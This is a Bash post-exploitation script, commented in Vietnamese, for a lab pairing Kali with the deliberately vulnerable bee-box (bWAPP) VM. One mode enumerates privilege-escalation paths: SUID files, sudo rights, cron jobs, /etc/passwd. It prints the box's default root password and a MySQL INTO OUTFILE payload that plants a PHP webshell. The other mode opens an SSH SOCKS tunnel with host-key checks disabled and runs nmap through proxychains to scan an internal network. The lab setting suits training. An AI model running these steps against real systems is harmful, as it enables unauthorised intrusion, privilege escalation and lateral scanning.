#!/usr/bin/env bash
# =============================================================================
#  03_pivot_privesc.sh — Post-exploitation: privesc checklist + Nmap qua pivot
# -----------------------------------------------------------------------------
#  CHẾ ĐỘ 1 (chạy TRÊN bee-box, sau khi đã có shell):
#     ./03_pivot_privesc.sh local
#     -> chỉ ĐỌC thông tin, không exploit, không sửa file
#
#  CHẾ ĐỘ 2 (chạy TRÊN Kali, sau khi có credential SSH):
#     sudo ./03_pivot_privesc.sh pivot 192.168.91.130 10.0.0.0/24
#     -> mở SOCKS 1080 qua SSH, rồi nmap -sT -Pn qua proxychains
#
#  Lưu ý: phải dùng -sT khi đi qua SOCKS (SYN scan cần raw socket).
# =============================================================================
set -uo pipefail

MODE="${1:-help}"
CYA=$'\e[36m'; GRN=$'\e[32m'; YEL=$'\e[33m'; RED=$'\e[31m'; NC=$'\e[0m'

banner() {
  printf '\n%s================================================================%s\n' "$CYA" "$NC"
  printf '%s  %s%s\n' "$CYA" "$*" "$NC"
  printf '%s================================================================%s\n' "$CYA" "$NC"
}

# =============================================================================
#  MODE: local — checklist nâng quyền trên bee-box
# =============================================================================
if [[ "$MODE" == "local" ]]; then

  banner "0. DANH TÍNH & HỆ ĐIỀU HÀNH"
  id
  hostname
  uname -a
  cat /etc/issue 2>/dev/null
  cat /etc/os-release 2>/dev/null | head -5

  banner "1. USER & QUYỀN"
  echo "--- user có shell ---"
  grep -E '/(bash|sh)$' /etc/passwd
  echo "--- sudo -l ---"
  sudo -n -l 2>/dev/null || echo "(cần mật khẩu hoặc không có sudo)"
  echo "--- group đáng chú ý ---"
  id
  getent group sudo adm disk docker 2>/dev/null

  banner "2. SUID / SGID"
  echo "--- SUID ---"
  find / -xdev -perm -4000 -type f 2>/dev/null
  echo "--- SGID ---"
  find / -xdev -perm -2000 -type f 2>/dev/null

  banner "3. FILE/DIR GHI ĐƯỢC (ngoài /tmp)"
  find / -xdev -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|tmp|dev)' | head -40

  banner "4. CRON & SERVICE"
  ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly 2>/dev/null
  crontab -l 2>/dev/null || echo "(không có crontab user)"
  cat /etc/crontab 2>/dev/null

  banner "5. KERNEL / PACKAGE CŨ"
  uname -r
  dpkg -l 2>/dev/null | grep -E '^ii' | awk '{print $2, $3}' | head -20

  banner "6. CẤU HÌNH DỊCH VỤ"
  echo "--- MySQL ---"
  ls -la /var/lib/mysql 2>/dev/null | head -5
  grep -rE '^(bind-address|skip-grant)' /etc/mysql 2>/dev/null
  echo "--- SSH ---"
  grep -E '^(PermitRootLogin|PasswordAuthentication|Port)' /etc/ssh/sshd_config 2>/dev/null
  echo "--- Webroot ---"
  ls -la /var/www 2>/dev/null
  echo "--- Log web (dấu vết tấn công) ---"
  ls -la /var/log/apache2 2>/dev/null | head -5

  banner "7. GỢI Ý ĐƯỜNG NÂNG QUYỀN"
  cat <<'EOF'
  a) Credential mặc định của box:  su - root   (mật khẩu: bug)
  b) MySQL:  mysql -uroot -pbug
        -> SELECT '<?php system($_GET["c"]); ?>'
           INTO OUTFILE '/var/www/bWAPP/shell.php';
     (chỉ khi secure_file_priv cho phép và user có FILE privilege)
  c) sudo -l: tìm binary NOPASSWD -> tra GTFOBins
  d) Kernel cũ: trên Kali chạy
        searchsploit linux kernel <version>
        searchsploit -m <EDB-ID>
  e) Không chạy exploit kernel nếu chưa snapshot: dễ panic VM.
EOF

  banner "8. DẤU VẾT CẦN DỌN DẸP"
  cat <<'EOF'
  - /var/www/bWAPP/shell.php, /var/www/*.php  (webshell upload)
  - /tmp/*.php, /tmp/*.sh, /tmp/.x
  - ~/.ssh/authorized_keys   (key lạ)
  - crontab lạ, user lạ trong /etc/passwd
  - reverse shell/tunnel đang chạy: ps aux | grep -E 'nc|bash -i|ssh -D'
EOF
  exit 0
fi

# =============================================================================
#  MODE: pivot — Nmap xuyên SOCKS qua SSH
# =============================================================================
if [[ "$MODE" == "pivot" ]]; then
  JUMP="${2:-192.168.91.130}"
  INTERNAL="${3:-192.168.91.0/24}"
  PORT="${SOCKS_PORT:-1080}"
  USER_SSH="${SSH_USER:-bee}"
  STAMP="$(date +%Y%m%d-%H%M%S)"
  OUTDIR="loot/pivot_${STAMP}"

  mkdir -p "$OUTDIR"

  banner "1. KIỂM TRA ĐIỀU KIỆN"
  command -v ssh >/dev/null || { echo "${RED}[x] thiếu ssh${NC}"; exit 1; }
  command -v proxychains4 >/dev/null || {
    echo "${RED}[x] thiếu proxychains4: sudo apt install -y proxychains4${NC}"; exit 1; }

  banner "2. MỞ SOCKS ${PORT} QUA ${USER_SSH}@${JUMP}"
  if ss -ltn 2>/dev/null | grep -q ":${PORT} "; then
    echo "${YEL}[!] Port ${PORT} đã có listener — dùng lại.${NC}"
  else
    # -N: không chạy command, -f: background, -D: dynamic SOCKS
    ssh -D "$PORT" -N -f -o StrictHostKeyChecking=no "${USER_SSH}@${JUMP}" \
      && echo "${GRN}[+] SOCKS5 đang nghe 127.0.0.1:${PORT}${NC}" \
      || { echo "${RED}[x] SSH tunnel thất bại${NC}"; exit 2; }
  fi

  banner "3. KIỂM TRA PROXYCHAINSCONF"
  if ! grep -qE "^socks5[[:space:]]+127\.0\.0\.1[[:space:]]+${PORT}$" /etc/proxychains4.conf 2>/dev/null; then
    echo "socks5 127.0.0.1 ${PORT}" | sudo tee -a /etc/proxychains4.conf >/dev/null
    echo "[+] Đã thêm socks5 127.0.0.1 ${PORT} vào /etc/proxychains4.conf"
  else
    echo "[i] Cấu hình đã có sẵn."
  fi

  banner "4. NMAP QUA PIVOT"
  echo "${YEL}[i] Bắt buộc -sT -Pn -n (SYN scan & ICMP không qua SOCKS được)${NC}"

  proxychains4 -q nmap -sT -Pn -n -T4 --open \
    -p 21,22,80,443,445,3306,3389,8080,8443 "$INTERNAL" \
    -oA "${OUTDIR}/pivot_services" 2>&1 | tee "${OUTDIR}/pivot_services.log"

  proxychains4 -q nmap -sT -Pn -n -T4 --open -p 22,80,443 \
    --script "http-title,ssh-auth-methods" \
    "$INTERNAL" -oA "${OUTDIR}/pivot_nse" 2>&1 | tee "${OUTDIR}/pivot_nse.log"

  banner "5. DỌN TUNNEL"
  pkill -f "ssh -D ${PORT}" && echo "[+] Đã đóng SOCKS ${PORT}"
  echo "Output: ${OUTDIR}"
  exit 0
fi

# =============================================================================
#  HELP
# =============================================================================
cat <<'EOF'
03_pivot_privesc.sh — post-exploitation cho lab Kali <-> bee-box

  Chạy TRÊN bee-box (sau khi có shell):
      ./03_pivot_privesc.sh local

  Chạy TRÊN Kali (pivot Nmap qua SOCKS):
      sudo ./03_pivot_privesc.sh pivot <bee_box_ip> [internal_cidr]

  Biến môi trường:
      SSH_USER=bee SOCKS_PORT=1080 sudo -E ./03_pivot_privesc.sh pivot 192.168.91.130 10.0.0.0/24
EOF
